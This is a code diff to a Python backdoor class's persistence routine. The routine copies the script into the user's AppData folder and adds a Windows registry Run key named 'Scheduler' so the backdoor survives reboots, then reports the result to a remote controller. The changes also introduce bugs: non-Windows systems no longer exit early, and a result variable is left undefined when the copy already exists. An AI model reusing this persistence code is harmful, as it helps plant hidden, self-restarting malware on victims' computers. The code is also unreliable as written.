@@ -27,29 +27,28 @@ class Backdoor:
         operating_system = platform.system()
         if operating_system != "Windows":
             self.reliable_send("[-] Non-Windows OS detected")
-            return
-        
-        self.reliable_send("[+] Windows OS detected")
-        self.reliable_send("[+] Continuing with Persistence Operations")
+
+        data = ""
+        data = data + "[+] Windows OS detected\n[+] Continuing with Persistence Operations"
         
         #location = os.environ["appdata"]+"\\scheduler.exe"
         location = os.environ["appdata"]+"\\client.py"
         if not os.path.exists(location):
-            # shutil.copyfile(sys.executable, location) # to copy executable
+            #shutil.copyfile(sys.executable, location) # to copy executable
             shutil.copyfile(__file__,location) # [to copy .py file]
-            """
-            [PERSISTENCE]
-                reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d C:/Users/user1/AppData/Roaming/scheduler.exe /f
-                                                                                                     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-                                                                                                     os.environ['appdata']
-            """
+            # [PERSISTENCE]
+            #  reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d C:/Users/user1/AppData/Roaming/scheduler.exe /f
+            #                                                                                        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+            #                                                                                        os.environ['appdata']
+            res = ""
             try:
-                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Scheduler /t REG_SZ /d '+location+' /f',shell=True)
-                res = "[+] Successfully added executable to the Registry"
-                return
+                subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Scheduler /t REG_SZ /d '+location+' /f',shell=True)
+                res = "\n[+] Successfully added executable to the Registry"
             except:
-                res = "[+] ERROR - Cannot add executable for persistence"
-                return
+                res = "\n[-] ERROR - Cannot add executable for persistence"
+        data = data + res
+        self.reliable_send(data)
+        return
 
     def reliable_send(self, data):
         if not isinstance(data, str):
